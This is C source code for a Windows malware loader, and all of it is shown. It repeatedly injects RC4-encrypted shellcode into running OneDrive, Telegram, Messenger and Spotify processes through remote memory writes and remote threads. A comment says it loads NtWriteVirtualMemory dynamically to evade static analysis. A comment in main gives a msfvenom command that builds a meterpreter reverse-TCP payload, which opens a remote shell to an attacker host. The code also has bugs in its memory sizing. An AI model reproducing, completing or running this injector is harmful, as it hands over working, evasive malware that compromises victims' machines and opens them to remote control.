// Coded by Mulvun, 1llM1ND3D
#include <windows.h>
#include <stdbool.h>
#include <tlhelp32.h>
#include "rc4.h"


#define MAX_TARGETS 4
#define RC4KEY "<enter rc4 key here>"

static const LPCSTR targets[] = {
                        "OneDrive.exe",
                        "Telegram.exe",
                        "Messenger.exe",
                        "Spotify.exe"
                        };

// process map structure.
typedef struct {
    
    DWORD pids[MAX_TARGETS];
    // scanning pids to prevent repetitive process injection
    DWORD *targeted;
    size_t targeted_size;
} pMap;

typedef NTSTATUS(NTAPI* _NtWriteVirtualMemory)(
                        HANDLE ProcessHandle,
                        PVOID BaseAddress,
                        PVOID Buffer,
                        ULONG NumberOfBytesToWrite,
                        PULONG NumberOfBytesWritten
                        );

// function to dynamically add pids to targeted array.
void add_pid(pMap *a, DWORD pid) {
    if (a->targeted_size) {
        a->targeted = realloc(a->targeted, a->targeted_size+1 * sizeof(DWORD));
    } 
    else {
        a->targeted = malloc(sizeof(DWORD));
    }
    a->targeted[a->targeted_size++] = pid;
}

// function to check whether pid evaluates to true or if pid has already been added to targeted array.
bool check_pid(pMap *a, DWORD pid) {
    if (pid) {
        for (size_t i=0; i<a->targeted_size; i++) {
            if (a->targeted[i] == pid)
                return false;
        }
        return true;
    }
    return false;
}

// function to filter the target processes' corresponding pid.
DWORD filter_pid(LPCSTR pname) {
    PROCESSENTRY32 pt;
    HANDLE hsnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    pt.dwSize = sizeof(PROCESSENTRY32);
    if (Process32First(hsnap, &pt)) {
        do {
            if (!lstrcmpi(pt.szExeFile, pname)) {
                CloseHandle(hsnap);
                return pt.th32ProcessID;
            }
        } while (Process32Next(hsnap, &pt));
    }
    CloseHandle(hsnap);
    return 0;
}

DWORD WINAPI scan_pids(LPVOID *lpParameter) {
    pMap *a = (pMap*)lpParameter;
    while (true) {
        for (size_t i=0; i<MAX_TARGETS; i++) {
            DWORD pid = filter_pid(targets[i]);
            if (check_pid(a, pid)) {
                a->pids[i] = pid;
            }
            else {
                // sleep to limit CPU usage.
                Sleep(15);
            }
        }
    }
    return 0;
}

DWORD WINAPI free_pids(LPVOID *lpParameter) {
    pMap *a = (pMap*)lpParameter;
    while (true) {
        Sleep(900 * 1000);
        if (a->targeted_size) {
            free(a->targeted);
            a->targeted_size = 0;
        }
    }
    return 0;
}

void inject(unsigned char shellcode[], int PAYLOADSIZE, DWORD pid) {
    // dynamically load NtWriteVirtualMemory API from ntdll.dll (to evade static analysis).
    _NtWriteVirtualMemory NtWriteVirtualMemory =
        (_NtWriteVirtualMemory)GetProcAddress(
	    				GetModuleHandleA("ntdll.dll"),
					"NtWriteVirtualMemory");

    
    int scsize = sizeof(int) * PAYLOADSIZE;
    LPVOID sc = VirtualAlloc(NULL, scsize, MEM_COMMIT, 0x04);

    
    memset(sc, '\0', scsize);
    RC4(RC4KEY, (char*)shellcode, (unsigned char*)sc, PAYLOADSIZE);

    // inject shellcode into process memory space.
    HANDLE processHandle = OpenProcess(
				    PROCESS_ALL_ACCESS,
				    FALSE,
				    pid
				    );
    PVOID remote_buf = VirtualAllocEx(
				processHandle,
				NULL,
				sizeof(sc),
				(MEM_RESERVE | MEM_COMMIT),
				PAGE_EXECUTE_READWRITE
				);
    NtWriteVirtualMemory(
		processHandle,
		remote_buf,
		(unsigned char*)sc,
		scsize, 
		0
		);
    HANDLE remoteThread = CreateRemoteThread(
				    processHandle,
				    NULL,
				    0,
				    (LPTHREAD_START_ROUTINE)remote_buf,
				    NULL,
				    0,
				    NULL
				    );
    CloseHandle(processHandle);
}

int main() {
    // msfvenom -p windows/meterpreter/reverse_tcp_rc4 LHOST=<host> LPORT=<port> RC4PASSWORD=<network_level_rc4_key> --encrypt rc4 --encrypt-key <binary_level_rc4_key>
    unsigned char shellcode[] = 
    < enter shellcode here >
    
    // instantiate
    pMap a = { {0}, {0}, 0 };

    // thread to Scan for pids.
    CreateThread(0, 0, scan_pids, &a, 0, 0);
    // thread to free targeted array to limit memory usage.
    CreateThread(0, 0, free_pids, &a, 0, 0);

    while (true) {
        for (int i=0; i<MAX_TARGETS; i++) {
            if (check_pid(&a, a.pids[i])) {
                inject(shellcode, sizeof(shellcode), a.pids[i]);
                add_pid(&a, a.pids[i]);
            }
            else {
            // sleep for 1 second to limit cpu usage.
            Sleep(1000);
            }
        }
    }
    return 0;   
}   